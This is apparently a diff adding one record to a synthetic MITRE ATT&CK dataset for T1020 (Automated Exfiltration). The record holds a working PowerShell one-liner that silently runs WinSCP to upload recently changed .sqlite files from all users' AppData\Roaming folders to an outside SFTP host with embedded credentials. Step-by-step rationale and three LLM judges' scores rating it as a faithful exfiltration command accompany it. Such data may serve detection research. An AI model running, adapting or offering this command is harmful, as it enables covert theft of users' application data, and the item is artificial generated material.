@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$r=\"/delta/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch on' 'option confirm off' 'open sftp://exfil:S3cr3t!@203.0.113.70/ -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' (\"put -resume C:\\Users\\*\\AppData\\Roaming\\*.sqlite `\"$r`\" -filemask=>=2D\") 'exit' | Out-Null 2>$null",
+  "explanation": "Automates incremental exfiltration of application databases updated within the last two days using SFTP and WinSCP filemask filtering.",
+  "rationale_steps": [
+    "Select high-value targets with time-based filtering",
+    "Open a pinned-hostkey SFTP session non-interactively",
+    "Upload with resume and minimal console interaction",
+    "Quietly complete and exit"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-1fd5c76e",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell line is well-formed with balanced quoting and parentheses, proper use of the call operator, valid WinSCP switches, and correct output redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "It correctly automates SFTP transfer of recently modified .sqlite files using batch mode, resume, and a time-based filemask, but is likely to fail as-is due to the placeholder host key and the documentation-only IP address.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:41:27.435355Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with properly balanced quotes, parentheses, valid PowerShell variable assignment, correct WinSCP parameter syntax, and appropriate error redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the Automated Exfiltration technique by using WinSCP to automatically transfer SQLite database files modified in the last two days from user profiles to a remote SFTP server with hardcoded credentials and hostkey verification.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:41:30.901913Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed, with balanced quotes, correct variable expansion, proper command separation for WinSCP arguments, and valid redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly executes T1020 by automating SFTP exfiltration of application databases using WinSCP's filemask for incremental transfers and non-interactive options, aligning perfectly with the technique's description.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:41:57.718408Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
